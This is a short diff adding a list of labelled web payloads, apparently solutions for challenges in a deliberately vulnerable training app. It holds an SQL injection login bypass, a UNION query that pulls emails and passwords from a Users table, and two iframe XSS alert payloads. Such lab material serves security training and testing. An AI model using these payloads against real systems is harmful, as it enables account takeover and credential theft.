@@ -1,0 +1,12 @@
+JUICE-001 (SQLi Login):
+' OR 1=1--
+
+JUICE-002 (SQLi Search):
+qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
+
+JUICE-003 (Reflected XSS):
+<iframe src="javascript:alert(`XSS`)">
+
+JUICE-004 (Stored XSS):
+<iframe src="javascript:alert(`xss`)"></iframe>
+
